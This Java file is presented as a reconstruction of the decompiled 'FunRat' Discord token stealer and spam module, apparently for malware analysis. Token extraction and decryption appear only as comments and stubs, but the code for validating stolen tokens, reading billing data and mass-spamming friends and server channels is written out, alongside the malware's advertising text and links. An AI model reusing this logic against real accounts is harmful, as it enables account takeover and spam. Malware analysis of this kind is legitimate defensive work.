/*
 * FunRat fourth-stage Discord token stealer and spam module:
 * reconstructed control flow.
 *
 * This is a reconstruction, not operational code. It is a cleaned,
 * human-readable view of the decompiled class, with library calls and
 * boilerplate removed. The authoritative raw decompilation is in
 * decompiled-stage2/dis/org/example/Main.java.
 *
 * The module does not upload stolen tokens to the FunRat panel. It validates
 * them against Discord and uses them in-process to spam friends and guild
 * channels. Parsed billing/payment-source metadata is not exfiltrated.
 */
package reconstructed;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.regex.*;

public final class DiscordSpam {
    static final String TARGET_GUILD = "1443109598579003414";
    static final String UA_ACCOUNT =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/91.0.4472.124 Safari/537.36";
    static final String UA_SPAM =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/124.0.0.0 Safari/537.36";

    static final Pattern ENCRYPTED_TOKEN_REGEX =
        Pattern.compile("dQw4w9WgXcQ:[^\"]*");
    static final Pattern TOKEN_REGEX =
        Pattern.compile("[\\w-]{24,29}\\.[\\w-]{6}\\.[\\w-]{25,110}");

    static final Set<String> tokens = new LinkedHashSet<>();
    static boolean found;

    static final String ROAMING = System.getenv("APPDATA");
    static final String LOCAL = System.getenv("LOCALAPPDATA");

    // The real message is longer and includes emoji and sales claims. The
    // distinctive body and all three advertised links are shown here.
    static final String SPAM_MESSAGE =
        ":red_circle::blue_circle: **YOUR MINECRAFT ACCOUNT IS ALREADY STOLEN** " +
        ":blue_circle::red_circle:\n\n" +
        "**:warning: RAT / STEALER MOD :warning:**\n\n" +
        ":file_folder: **TDATA** - Telegram fully compromised\n" +
        ":syringe: **Discord** - tokens, Nitro, servers ready for dump\n" +
        ":globe_with_meridians: **Browsers** - Binance, Bybit, MetaMask, Phantom wide open\n" +
        ":key: **Crypto** - Exodus, Trust Wallet, Ronin withdrawals ready\n" +
        ":desktop: **Minecraft** - launchers, premium accounts full control\n" +
        ":credit_card: **All** - passwords, screenshots, seed phrases accessible\n\n" +
        "**:fire: THREE YEARS ON THE MARKET :fire:**\n" +
        "Not some one-day scam. Thousands of clients worldwide made bank.\n\n" +
        "**:free: FREE = FULL FUNCTIONALITY :free:**\n" +
        "No demos. Build it, grab accounts and crypto.\n\n" +
        "**:link: LINKS :link:**\n" +
        ":globe_with_meridians: https://funrat.co/\n" +
        ":mailbox_with_mail: https://t.me/weloverat\n" +
        ":video_game: https://discord.gg/TSYMmF9B2y\n\n" +
        "**:skull: Get in while accounts are juicy. Inside = money. Outside = loss. Act now. :skull:**";

    public static void main(String[] args) {
        try {
            System.out.println("So... Yes!");
            getDiscordToken();

            for (String token : tokens) {
                if (found) {
                    continue;
                }
                // A token already in the operator's guild is treated as a
                // tester/whitelisted account and receives no spam.
                isUserInGuild(token, TARGET_GUILD);
            }
        } catch (Exception e) {
            System.out.println("An error occurred during the Discord token collection process");
            e.printStackTrace();
        }
    }

    // ---------------------------------------------------------------------
    // Token discovery
    // ---------------------------------------------------------------------

    static void getDiscordToken() {
        getClientTokens();
        getBrowserTokens();

        for (String candidate : new ArrayList<>(tokens)) {
            // Decrypt, validate /users/@me, keep only working tokens, and
            // parse billing data (parsed but not forwarded).
            String token = validateAndDecrypt(candidate);
            if (token != null) {
                tokens.remove(candidate);
                tokens.add(token);
            }
        }
    }

    static void getClientTokens() {
        // Discord, Discord Canary, and Discord PTB:
        //   %APPDATA%\<client>\Local Storage\leveldb
        //   %APPDATA%\<client>\Local Storage\leveldb\*.ldb
        //   %APPDATA%\<client>\Local Storage\leveldb\*.log
        // Reads encrypted token values matching dQw4w9WgXcQ:<base64>.
    }

    static void getBrowserTokens() {
        // Chromium-family profiles: Chrome, Chrome Beta/Dev/SxS, Edge, Brave,
        // Vivaldi, Opera, Opera GX/Next/Developer, Yandex, Chromium, Iridium,
        // Epic Privacy Browser, and Falkon. Firefox-family profiles: Firefox,
        // Waterfox, LibreWolf, and Pale Moon.
        //
        // Chromium paths contain Local Storage\leveldb; Firefox paths are
        // reduced to storage\default and filtered for a "discord" entry. The
        // module reads .ldb, .log, and .sqlite files and extracts plaintext
        // Discord token patterns.
    }

    static String validateAndDecrypt(String candidate) {
        try {
            String token = candidate.startsWith("dQw4w9WgXcQ:")
                ? decryptToken(candidate)
                : candidate;
            if (token == null) {
                return null;
            }

            // v9 is the primary validation endpoint.
            HttpURLConnection c = getAccount(
                "https://discord.com/api/v9/users/@me", token);
            if (c.getResponseCode() != 200) {
                return null;
            }

            // The original also fetches v6 account metadata, then billing
            // metadata. The parsed payment result is discarded; only the token
            // is retained.
            if (getAccount("https://discord.com/api/v6/users/@me", token)
                    .getResponseCode() != 200) {
                return null;
            }
            HttpURLConnection billing = getAccount(
                "https://discord.com/api/v6/users/@me/billing/payment-sources", token);
            billing.getResponseCode();

            return token;
        } catch (Exception ignored) {
            return null;
        }
    }

    static String decryptToken(String value) {
        // Browser/Electron token decryption:
        //   Local State -> os_crypt.encrypted_key
        //   base64-decode, strip DPAPI prefix, CryptUnprotectData
        //   AES-GCM with the dQw4w9WgXcQ: payload
        //   12-byte IV, 16-byte GCM tag
        return null;
    }

    // ---------------------------------------------------------------------
    // Guild check and spam
    // ---------------------------------------------------------------------

    static void isUserInGuild(String token, String guildId) {
        try {
            JsonArray guilds = getJsonArray(
                "https://discord.com/api/v9/users/@me/guilds", token);

            for (JsonObject guild : guilds.objects()) {
                if (guildId.equals(guild.string("id"))) {
                    System.out.println("Stop testing rat yourself");
                    found = true;
                    return;
                }
            }

            // Not whitelisted: spam DMs in parallel and guild channels now.
            new Thread(() -> runMassDm(token)).start();

            for (JsonObject guild : guilds.objects()) {
                String id = guild.string("id");
                HttpURLConnection c = get(
                    "https://discord.com/api/v10/guilds/" + id + "/channels", token);
                if (c.getResponseCode() != 200) {
                    System.out.println("Error: " + c.getResponseCode());
                    continue;
                }

                JsonArray channels = readJsonArray(c);
                for (JsonObject channel : channels.objects()) {
                    if (channel.integer("type") != 0) {
                        continue; // text channels only
                    }
                    String channelId = channel.string("id");
                    if (!hasPermissionToSend(channel)) {
                        continue;
                    }
                    sendMessage(token, channelId,
                        "@everyone @here\n\n" + SPAM_MESSAGE, channelId);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static boolean hasPermissionToSend(JsonObject channel) {
        if (!channel.has("permission_overwrites")) {
            return false;
        }
        for (JsonObject overwrite : channel.array("permission_overwrites").objects()) {
            long allow = overwrite.longValue("allow");
            long deny = overwrite.longValue("deny");
            // 0x800 = SEND_MESSAGES.
            if ((allow & 0x800L) != 0L) {
                return true;
            }
            if ((deny & 0x800L) != 0L) {
                return false;
            }
        }
        return true;
    }

    static void runMassDm(String token) {
        for (String userId : loadFriends(token)) {
            try {
                String channelId = createDMChannel(token, userId);
                if (channelId == null) {
                    continue;
                }
                sendMessage(token, channelId,
                    "<@" + userId + ">\n\n" + SPAM_MESSAGE, userId);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    static List<String> loadFriends(String token) {
        List<String> ids = new ArrayList<>();
        try {
            JsonArray relationships = getJsonArray(
                "https://discord.com/api/v9/users/@me/relationships", token);
            for (JsonObject relationship : relationships.objects()) {
                ids.add(relationship.string("id"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return ids;
    }

    static String createDMChannel(String token, String userId) throws Exception {
        JsonObject body = new JsonObject();
        body.add("recipients", List.of(userId));

        HttpURLConnection c = postJson(
            "https://discord.com/api/v9/users/@me/channels", token, body.toString());
        if (c.getResponseCode() / 100 != 2) {
            return null;
        }
        JsonObject response = readJsonObject(c);
        return response.has("id") ? response.string("id") : null;
    }

    static void sendMessage(String token, String channelId,
                            String message, String nonce) throws Exception {
        JsonObject body = new JsonObject();
        body.addProperty("content", message);
        body.addProperty("nonce", nonce);
        body.addProperty("tts", false);

        HttpURLConnection c = postJson(
            "https://discord.com/api/v9/channels/" + channelId + "/messages",
            token, body.toString());

        int status = c.getResponseCode();
        if (status == 200 || status == 204) {
            System.out.println("Message sent to user ID: " + nonce);
        } else if (status == 429) {
            System.out.println("Rate limited. Skipping user ID: " + nonce);
        } else if (status == 403) {
            System.out.println("DMs closed for user ID: " + nonce);
        } else if (status == 400) {
            System.out.println("Captcha detected for user ID: " + nonce);
        } else {
            System.out.println("Failed to send message to user ID: " + nonce +
                ". Status code: " + status);
        }
    }

    // ---------------------------------------------------------------------
    // HTTP helpers
    // ---------------------------------------------------------------------

    static HttpURLConnection get(String url, String token) throws IOException {
        return request(url, token, "GET", UA_SPAM);
    }

    static HttpURLConnection getAccount(String url, String token) throws IOException {
        return request(url, token, "GET", UA_ACCOUNT);
    }

    static HttpURLConnection postJson(String url, String token, String body)
            throws IOException {
        HttpURLConnection c = request(url, token, "POST", UA_SPAM);
        c.setRequestProperty("Content-Type", "application/json");
        c.setDoOutput(true);
        try (OutputStream out = c.getOutputStream()) {
            out.write(body.getBytes(StandardCharsets.UTF_8));
        }
        return c;
    }

    static HttpURLConnection request(String url, String token, String method,
                                     String userAgent) throws IOException {
        HttpURLConnection c = (HttpURLConnection) URI.create(url).toURL().openConnection();
        c.setRequestMethod(method);
        c.setRequestProperty("Authorization", token);
        c.setRequestProperty("User-Agent", userAgent);
        return c;
    }

    static JsonArray getJsonArray(String url, String token) throws IOException {
        return readJsonArray(get(url, token));
    }

    static JsonArray readJsonArray(HttpURLConnection c) throws IOException {
        return JsonArray.parse(readBody(c));
    }

    static JsonObject readJsonObject(HttpURLConnection c) throws IOException {
        return JsonObject.parse(readBody(c));
    }

    static String readBody(HttpURLConnection c) throws IOException {
        try (BufferedReader in = new BufferedReader(
                new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
            StringBuilder body = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                body.append(line);
            }
            return body.toString();
        }
    }

    // Minimal stand-ins for Gson types used by the original class.
    static final class JsonArray {
        static JsonArray parse(String s) { return new JsonArray(); }
        List<JsonObject> objects() { return List.of(); }
    }

    static final class JsonObject {
        static JsonObject parse(String s) { return new JsonObject(); }
        boolean has(String k) { return false; }
        String string(String k) { return ""; }
        int integer(String k) { return 0; }
        long longValue(String k) { return 0L; }
        JsonArray array(String k) { return new JsonArray(); }
        void add(String k, Object v) {}
        void addProperty(String k, Object v) {}
    }
}
